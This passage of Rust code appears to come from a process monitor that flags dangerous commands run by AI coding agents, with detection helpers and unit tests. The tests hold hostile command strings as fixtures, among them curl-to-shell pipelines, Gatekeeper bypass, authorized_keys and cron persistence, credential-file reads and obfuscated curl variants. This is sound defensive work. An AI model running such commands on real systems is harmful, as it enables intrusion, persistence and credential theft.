            .next()
            .unwrap_or_default()
            .split(':')
            .next()
            .unwrap_or_default()
            .trim_matches(|c| c == '[' || c == ']');
        let Some((a, b, _, _)) = parse_ipv4_octets(host) else {
            return false;
        };
        if a == 10 {
            return false;
        }
        if a == 172 && (16..=31).contains(&b) {
            return false;
        }
        if a == 192 && b == 168 {
            return false;
        }
        cmdline.contains(tool_name)
    })
}

fn writes_launchd_paths(cmdline: &str) -> bool {
    if !cmdline.contains("/library/launchdaemons/")
        && !cmdline.contains("~/library/launchagents/")
        && !cmdline.contains("/users/")
        && !cmdline.contains("/library/launchagents/")
    {
        return false;
    }
    if cmdline.contains("/users/") && !cmdline.contains("/library/launchagents/") {
        return false;
    }

    cmdline.contains(" > ")
        || cmdline.contains(" >> ")
        || cmdline.contains("tee ")
        || cmdline.contains("cp ")
        || cmdline.contains("mv ")
        || cmdline.contains("install ")
        || cmdline.contains("cat ")
        || cmdline.contains("echo ")
}

fn reads_kube_config(cmdline: &str) -> bool {
    cmdline.contains("~/.kube/config")
        || cmdline.contains("/.kube/config")
        || cmdline.contains("$home/.kube/config")
}

fn parse_ipv4_octets(host: &str) -> Option<(u8, u8, u8, u8)> {
    let mut parts = host.split('.');
    let a = parts.next()?.parse::<u8>().ok()?;
    let b = parts.next()?.parse::<u8>().ok()?;
    let c = parts.next()?.parse::<u8>().ok()?;
    let d = parts.next()?.parse::<u8>().ok()?;
    if parts.next().is_some() {
        return None;
    }
    Some((a, b, c, d))
}

fn is_rmm_tool_name(process_name: &str) -> bool {
    [
        "screenconnect",
        "anydesk",
        "teamviewer",
        "connectwise",
        "rustdesk",
    ]
        .iter()
        .any(|needle| process_name.contains(needle))
}

fn has_suspicious_rmm_parent(parent_name: &str) -> bool {
    ["code", "cursor", "windsurf", "node", "python", "electron"]
        .iter()
        .any(|needle| parent_name.contains(needle))
}

fn is_shell_name(name: &str) -> bool {
    matches!(name, "bash" | "sh" | "zsh" | "fish" | "dash" | "csh" | "tcsh")
}

fn is_package_manager_name(name: &str) -> bool {
    ["npm", "pip", "cargo", "gem", "yarn", "pnpm", "bun"]
        .iter()
        .any(|needle| name.contains(needle))
}

fn contains_hidden_unicode(raw: &str) -> bool {
    raw.chars().any(|ch| {
        matches!(ch, '\u{200b}' | '\u{200d}' | '\u{feff}') || ('\u{e000}'..='\u{f8ff}').contains(&ch)
    })
}

fn looks_like_file_read_command(cmdline: &str) -> bool {
    cmdline.starts_with("cat ")
        || cmdline.starts_with("less ")
        || cmdline.starts_with("more ")
        || cmdline.starts_with("head ")
        || cmdline.starts_with("tail ")
        || cmdline.starts_with("grep ")
        || cmdline.starts_with("awk ")
        || cmdline.starts_with("sed ")
        || cmdline.contains(" cat ")
}

fn reads_agent_credential_files(cmdline: &str) -> bool {
    [".env", ".npmrc", ".netrc", ".gitconfig"]
        .iter()
        .any(|needle| cmdline.contains(needle))
}

fn ancestry_contains_ai_runtime(ancestry_names: &[String]) -> bool {
    ancestry_names.iter().any(|name| {
        let lower = name.to_ascii_lowercase();
        ["node", "python", "cursor", "code", "codex"]
            .iter()
            .any(|needle| lower.contains(needle))
    })
}

fn in_ai_skill_directory(working_dir: &str) -> bool {
    [
        "/skills/",
        "/plugins/",
        "/extensions/",
        "/.openclaw/",
        "/.cursor/",
        "/.vscode/",
    ]
    .iter()
    .any(|needle| working_dir.contains(needle))
}

fn is_pyinstaller_unexpected_location(
    env: &HashMap<String, String>,
    lower_cmdline: &str,
    lower_exe: &str,
) -> bool {
    let has_mei_env = env
        .keys()
        .any(|key| key.eq_ignore_ascii_case("_MEIPASS") || key.eq_ignore_ascii_case("_MEIPASS2"));
    let runs_from_mei = lower_cmdline.contains("/_mei") || lower_exe.contains("/_mei");
    let in_dependency_tree = lower_cmdline.contains("node_modules")
        || lower_cmdline.contains("site-packages")
        || lower_cmdline.contains("dist-packages")
        || lower_exe.contains("node_modules")
        || lower_exe.contains("site-packages")
        || lower_exe.contains("dist-packages");
    (has_mei_env || runs_from_mei) && in_dependency_tree
}

fn looks_like_network_child_process(process_name: &str, cmdline: &str) -> bool {
    ["curl", "wget", "nc", "ncat", "python", "python3"]
        .iter()
        .any(|needle| process_name == *needle || cmdline.starts_with(&format!("{needle} ")))
}

fn contains_public_ipv4_reference(cmdline: &str) -> bool {
    cmdline.split_whitespace().any(|token| {
        let host = token
            .trim_start_matches("http://")
            .trim_start_matches("https://")
            .split('/')
            .next()
            .unwrap_or_default()
            .split(':')
            .next()
            .unwrap_or_default()
            .trim_matches(|c| c == '[' || c == ']');

        let Some((a, b, _, _)) = parse_ipv4_octets(host) else {
            return false;
        };
        if a == 10 || a == 127 {
            return false;
        }
        if a == 172 && (16..=31).contains(&b) {
            return false;
        }
        if a == 192 && b == 168 {
            return false;
        }
        true
    })
}

fn writes_cron_path(cmdline: &str) -> bool {
    let writes = cmdline.contains(" > ")
        || cmdline.contains(" >> ")
        || cmdline.contains("tee ")
        || cmdline.contains("cp ")
        || cmdline.contains("mv ")
        || cmdline.contains("install ");
    writes && (cmdline.contains("/var/spool/cron/") || cmdline.contains("/etc/cron.d/"))
}

fn writes_authorized_keys(cmdline: &str) -> bool {
    (cmdline.contains(" > ")
        || cmdline.contains(" >> ")
        || cmdline.contains("tee ")
        || cmdline.contains("cp ")
        || cmdline.contains("mv ")
        || cmdline.contains("install "))
        && (cmdline.contains("~/.ssh/authorized_keys")
            || cmdline.contains("/.ssh/authorized_keys"))
}

fn normalize_exec_token(input: &str) -> String {
    let token = input.trim().trim_matches('"').trim_matches('\'');
    Path::new(token)
        .file_name()
        .and_then(|name| name.to_str())
        .unwrap_or(token)
        .to_ascii_lowercase()
}

/// Returns true when an allow-list entry matches a process name, command token, or executable path.
pub fn allow_list_entry_matches(entry_name: &str, name: &str, cmdline: &str, exe: &str) -> bool {
    let needle = entry_name.trim().to_ascii_lowercase();
    let name = name.to_ascii_lowercase();
    let cmdline = cmdline.to_ascii_lowercase();
    let exe = exe.to_ascii_lowercase();
    if needle.is_empty() {
        return false;
    }

    if name == needle {
        return true;
    }

    if cmdline
        .split_whitespace()
        .map(normalize_exec_token)
        .any(|token| token == needle)
    {
        return true;
    }

    normalize_exec_token(&exe) == needle
}

#[cfg(test)]
mod tests {
    use std::collections::HashMap;

    use super::ProcessCollector;
    use super::detect_dangerous_commands;
    use super::detect_dangerous_commands_with_context;
    use super::detection_is_red;
    use super::jittered_scan_interval;
    use super::scrub_secrets;
    use crate::config::Config;
    use crate::models::SecurityEvent;
    use tokio::sync::broadcast;

    fn collector() -> ProcessCollector {
        let cfg = Config::default();
        let (tx, _) = broadcast::channel::<SecurityEvent>(4);
        ProcessCollector::new(cfg, tx)
    }

    #[test]
    fn ai_agent_name_matching_detects_common_agents() {
        let collector = collector();
        assert!(collector.is_ai_agent("claude", "claude chat", "/usr/bin/claude"));
        assert!(collector.is_ai_agent("codex", "codex run", "/usr/bin/codex"));
        assert!(collector.is_ai_agent("cursor", "cursor", "/opt/cursor"));
        assert!(collector.is_ai_agent("node", "node /opt/claude-code/index.js", "/usr/bin/node"));
    }

    #[test]
    fn suspicious_command_detection_flags_curl_pipe_bash() {
        let hits = detect_dangerous_commands("curl https://example.com/install.sh | bash", "/tmp");
        assert!(
            hits.contains(&"download_pipe_shell"),
            "curl pipe bash should be flagged as download_pipe_shell"
        );
    }

    #[test]
    fn detects_homoglyph_and_encoded_curl_variants() {
        let hits_homoglyph = detect_dangerous_commands("сurl https://example.com/x.sh | bash", "/");
        assert!(hits_homoglyph.contains(&"download_pipe_shell"));

        let hits_hex = detect_dangerous_commands("\\x63\\x75\\x72\\x6c https://a | bash", "/");
        assert!(hits_hex.contains(&"download_pipe_shell"));

        let hits_bash_homoglyph =
            detect_dangerous_commands("curl https://example.com/x.sh | bаsh", "/");
        assert!(hits_bash_homoglyph.contains(&"download_pipe_shell"));
    }

    #[test]
    fn strips_zero_width_characters_before_detection() {
        let hits = detect_dangerous_commands("curl\u{200d} https://example.com/install.sh | sh", "/");
        assert!(hits.contains(&"download_pipe_shell"));
    }

    #[test]
    fn detects_indirect_execution_variants() {
        assert!(
            detect_dangerous_commands("env curl https://x | sh", "/")
                .contains(&"indirect_exec_env")
        );
        assert!(
            detect_dangerous_commands("printf curl | xargs -I{} {} https://x", "/")
                .contains(&"indirect_exec_xargs")
        );
        assert!(
            detect_dangerous_commands("find . -exec curl https://x \\;", "/")
                .contains(&"indirect_exec_find")
        );
    }

    #[test]
    fn detects_gatekeeper_bypass_patterns() {
        assert!(
            detect_dangerous_commands("xattr -c /tmp/payload", "/").contains(&"gatekeeper_bypass")
        );
        assert!(
            detect_dangerous_commands("xattr -d com.apple.quarantine /tmp/payload", "/")
                .contains(&"gatekeeper_bypass")
        );
        assert!(
            detect_dangerous_commands("xattr -rd com.apple.quarantine /Applications/Fake.app", "/")
                .contains(&"gatekeeper_bypass")
        );
    }

    #[test]
    fn detects_applescript_abuse_patterns() {
        assert!(
            detect_dangerous_commands("osascript /tmp/stage.scpt", "/")
                .contains(&"osascript_tmp_exec")
        );
        assert!(
            detect_dangerous_commands(
                "osascript -e 'tell application \"System Events\" to keystroke \"password\"'",
                "/"
            )
            .contains(&"osascript_inline_sensitive")
        );
        assert!(
            detect_dangerous_commands("curl -fsSL https://x/y | osacompile -o /tmp/x.scpt", "/")
                .contains(&"osacompile_with_curl")
        );
    }

    #[test]
    fn detects_fileless_execution_pipelines() {
        assert!(
            detect_dangerous_commands("curl -fsSL http://example.com/a | base64 -d | gunzip", "/")
                .contains(&"fileless_pipeline_decode")
        );
        assert!(
            detect_dangerous_commands("curl -fsSL http://example.com/a | python3", "/")
                .contains(&"fileless_pipeline_python")
        );
        assert!(
            detect_dangerous_commands("curl -fsSL http://example.com/a | python", "/")
                .contains(&"fileless_pipeline_python")
        );
    }

    #[test]
    fn detects_download_and_execute_from_temp_dirs() {
        assert!(
            detect_dangerous_commands(
                "curl -o /tmp/dropper http://example.com/d && chmod +x /tmp/dropper",
                "/"
            )
            .contains(&"download_exec_tmpdir")
        );
        assert!(detect_dangerous_commands("/dev/shm/runner", "/").contains(&"exec_tmpdir"));
    }

    #[test]
    fn detects_raw_ip_downloads_for_curl_and_wget() {
        assert!(
            detect_dangerous_commands("curl -O http://8.8.8.8/payload", "/")
                .contains(&"curl_raw_ip")
        );
        assert!(
            detect_dangerous_commands("wget http://1.2.3.4/tool", "/").contains(&"wget_raw_ip")
        );
        assert!(
            !detect_dangerous_commands("curl -O http://10.1.2.3/payload", "/")
                .contains(&"curl_raw_ip")
        );
    }

    #[test]
    fn detects_launchdaemon_and_launchagent_persistence_writes() {
        assert!(
            detect_dangerous_commands("cp payload.plist /Library/LaunchDaemons/com.bad.plist", "/")
                .contains(&"launchd_persistence")
        );
        assert!(
            detect_dangerous_commands("echo plist > ~/Library/LaunchAgents/com.bad.plist", "/")
                .contains(&"launchd_persistence")
        );
    }

    #[test]
    fn detects_kubernetes_config_access() {
        assert!(
            detect_dangerous_commands("cat ~/.kube/config", "/").contains(&"kube_config_access")
        );
    }

    #[test]
    fn detects_gatekeeper_bypass_xattr_clear() {
        assert!(
            detect_dangerous_commands("xattr -c /tmp/payload", "/").contains(&"gatekeeper_bypass")
        );
    }

    #[test]
    fn detects_gatekeeper_bypass_xattr_quarantine_delete() {
        assert!(
            detect_dangerous_commands("xattr -d com.apple.quarantine /tmp/payload", "/")
                .contains(&"gatekeeper_bypass")
        );
    }

    #[test]
    fn detects_osascript_tmp_execution() {
        assert!(
            detect_dangerous_commands("osascript /tmp/stage.scpt", "/")
                .contains(&"osascript_tmp_exec")
        );
    }

    #[test]
    fn detects_osascript_sensitive_keystroke_keywords() {
        assert!(
            detect_dangerous_commands(
                "osascript -e 'tell application \"System Events\" to keystroke \"password\"'",
                "/"
            )
            .contains(&"osascript_inline_sensitive")
        );
    }

    #[test]
    fn detects_fileless_pipeline_curl_to_python3() {
        assert!(
            detect_dangerous_commands("curl -fsSL http://example.com/a | python3", "/")
                .contains(&"fileless_pipeline_python")
        );
    }

    #[test]
    fn detects_curl_raw_public_ipv4_download() {
        assert!(
            detect_dangerous_commands("curl -O http://8.8.8.8/payload", "/")
                .contains(&"curl_raw_ip")
        );
    }

    #[test]
    fn ignores_curl_raw_rfc1918_ipv4_download() {
        assert!(
            !detect_dangerous_commands("curl -O http://192.168.1.1/payload", "/")
                .contains(&"curl_raw_ip")
        );
    }

    #[test]
    fn detects_download_execute_from_tmp_chmod() {
        assert!(detect_dangerous_commands("chmod +x /tmp/payload", "/").contains(&"download_exec"));
    }

    #[test]
    fn detects_launchagent_write_persistence_path() {
        assert!(
            detect_dangerous_commands("echo plist > ~/Library/LaunchAgents/com.bad.plist", "/")
                .contains(&"launchd_persistence")
        );
    }

    #[test]
    fn detects_reading_kube_config_credentials() {
        assert!(
            detect_dangerous_commands("cat ~/.kube/config", "/").contains(&"kube_config_access")
        );
    }

    #[test]
    fn detects_fileless_pipeline_base64_gunzip_decode() {
        assert!(
            detect_dangerous_commands("curl -fsSL http://example.com/a | base64 -d | gunzip", "/")
                .contains(&"fileless_pipeline_decode")
        );
    }

    #[test]
    fn detects_rmm_spawned_by_ide_parent() {
        let hits = detect_dangerous_commands_with_context(
            "screenconnect --session abc",
            "/home/ryan/projects/leash",
            "screenconnect",
            "code",
            "code --reuse-window .",
            &["codex".into(), "code".into(), "screenconnect".into()],
            &HashMap::new(),
            "/usr/bin/screenconnect",
        );
        assert!(hits.contains(&"rmm_suspicious_parent"));
        assert!(detection_is_red("rmm_suspicious_parent"));
    }

    #[test]
    fn detects_npm_postinstall_shell_execution() {
        let hits = detect_dangerous_commands_with_context(
            "sh -c ./postinstall.sh",
            "/tmp/pkg",
            "sh",
            "npm",
            "npm install evil-pkg",
            &["node".into(), "npm".into(), "sh".into()],
            &HashMap::new(),
            "/bin/sh",
        );
        assert!(hits.contains(&"npm_pip_postinstall_shell"));
    }

    #[test]
    fn detects_hidden_unicode_in_command() {
        let hits = detect_dangerous_commands_with_context(
            "curl\u{200b} https://example.com/install.sh | sh",
            "/tmp",
            "sh",
            "bash",
            "bash -lc run",
            &["codex".into(), "bash".into(), "sh".into()],
            &HashMap::new(),
            "/bin/sh",
        );
        assert!(hits.contains(&"hidden_unicode_command"));
        assert!(detection_is_red("hidden_unicode_command"));
    }

    #[test]
    fn detects_ai_agent_credential_access_reads() {
        let hits = detect_dangerous_commands_with_context(
            "cat ~/.npmrc",
            "/home/ryan",
            "cat",
            "python3",
            "python3 agent.py",
            &["codex".into(), "python3".into(), "cat".into()],
            &HashMap::new(),
            "/bin/cat",
        );
        assert!(hits.contains(&"ai_agent_credential_access"));
        assert!(detection_is_red("ai_agent_credential_access"));
    }

    #[test]
    fn detects_process_spawn_from_skill_like_directories() {
        let hits = detect_dangerous_commands_with_context(
            "node run-task.js",
            "/home/ryan/.codex/skills/custom",
            "node",
            "codex",
            "codex run",
            &["codex".into(), "node".into()],
            &HashMap::new(),
            "/usr/bin/node",
        );
        assert!(hits.contains(&"ai_skill_directory_spawn"));
    }

    #[test]
    fn detects_pyinstaller_binary_in_dependency_tree() {
        let mut env = HashMap::new();
        env.insert("_MEIPASS".to_string(), "/tmp/_MEI12345".to_string());
        let hits = detect_dangerous_commands_with_context(
            "/tmp/_MEI12345/payload",
            "/tmp",
            "payload",
            "node",
            "node node_modules/evil/install.js",
            &["node".into(), "payload".into()],
            &env,
            "/home/ryan/project/node_modules/evil/_MEI12345/payload",
        );
        assert!(hits.contains(&"pyinstaller_unexpected_location"));
        assert!(detection_is_red("pyinstaller_unexpected_location"));
    }

    #[test]
    fn detects_external_ip_connection_during_install() {
        let hits = detect_dangerous_commands_with_context(
            "curl http://8.8.8.8/payload.sh",
            "/tmp/pkg",
            "curl",
            "npm",
            "npm install suspicious-package",
            &["node".into(), "npm".into(), "curl".into()],
            &HashMap::new(),
            "/usr/bin/curl",
        );
        assert!(hits.contains(&"package_install_external_ip"));
    }

    #[test]
    fn detects_ld_preload_environment_variable() {
        let mut env = HashMap::new();
        env.insert("LD_PRELOAD".to_string(), "/tmp/libmalicious.so".to_string());
        let hits = detect_dangerous_commands_with_context(
            "/usr/bin/ls",
            "/tmp",
            "ls",
            "bash",
            "bash -lc ls",
            &["codex".into(), "bash".into(), "ls".into()],
            &env,
            "/usr/bin/ls",
        );
        assert!(hits.contains(&"ld_preload_set"));
        assert!(detection_is_red("ld_preload_set"));
    }

    #[test]
    fn detects_crontab_modification_commands() {
        assert!(detect_dangerous_commands("crontab -e", "/").contains(&"crontab_modification"));
        assert!(
            detect_dangerous_commands("echo job > /etc/cron.d/system-update", "/")
                .contains(&"crontab_modification")
        );
    }

    #[test]
    fn detects_ssh_authorized_keys_modification() {
        let hits = detect_dangerous_commands("echo ssh-rsa AAAA >> ~/.ssh/authorized_keys", "/");
        assert!(hits.contains(&"ssh_authorized_keys_modification"));
        assert!(detection_is_red("ssh_authorized_keys_modification"));
    }

    #[test]
    fn ai_agent_name_matching_handles_case_and_underscore_variants() {
        let collector = collector();
        assert!(collector.is_ai_agent("claude", "interactive chat", "/usr/bin/tool"));
        assert!(collector.is_ai_agent("CLAUDE", "interactive chat", "/usr/bin/tool"));
        assert!(collector.is_ai_agent("worker", "claude_code --run task", "/usr/bin/python3"));
    }

    #[test]
    fn non_ai_process_is_not_flagged() {
        let collector = collector();
        assert!(!collector.is_ai_agent("sshd", "sshd: ryan", "/usr/sbin/sshd"));
    }

    #[test]
    fn scan_interval_jitter_stays_within_twenty_percent() {
        let base_ms = 1_000_u64;
        for _ in 0..512 {
            let jittered = jittered_scan_interval(base_ms).as_millis() as u64;
            assert!((800..=1200).contains(&jittered));
        }
    }

    #[test]
    fn allow_list_match_requires_exact_token() {
        let mut cfg = Config::default();
        cfg.allow_list.push(crate::config::AllowListEntry {
            name: "trusted-helper".to_string(),
            reason: "approved for local automation".to_string(),
        });
        cfg.allow_list.push(crate::config::AllowListEntry {
            name: "code".to_string(),
            reason: "exact match only".to_string(),
        });
        let (tx, _) = broadcast::channel::<SecurityEvent>(4);
        let collector = ProcessCollector::new(cfg, tx);

        assert!(
            collector
                .match_allow_list(
                    "trusted-helper",
                    "trusted-helper --run",
                    "/usr/bin/trusted-helper"
                )
                .is_some()
        );
        assert!(
            collector
                .match_allow_list(
                    "python3",
                    "python3 /opt/trusted-helper/run.py",
                    "/usr/bin/python3"
                )
                .is_none()
        );
        assert!(
            collector
                .match_allow_list(
                    "python3",
                    "/usr/local/bin/trusted-helper --run",
                    "/usr/bin/python3"
                )
                .is_some()
        );
        assert!(
            collector
                .match_allow_list("codex", "codex run", "/usr/local/bin/codex")
                .is_none()
        );
        assert!(
            collector
                .match_allow_list("code", "code .", "/usr/bin/code")
                .is_some()
        );
        assert!(
            collector
                .match_allow_list("sshd", "sshd: ryan", "/usr/sbin/sshd")
                .is_none()
        );
    }

    #[test]
    fn scrub_secrets_redacts_known_patterns() {
        let input = "sk-abcdefghijklmnopqrstuvwxyz12345 AKIAABCDEFGHIJKLMNOP api_key=abc123";
        let output = scrub_secrets(input);
        assert!(!output.contains("sk-abcdefghijklmnopqrstuvwxyz12345"));
        assert!(!output.contains("AKIAABCDEFGHIJKLMNOP"));
        assert!(!output.contains("api_key=abc123"));
        assert!(output.contains("[REDACTED]"));
    }
}
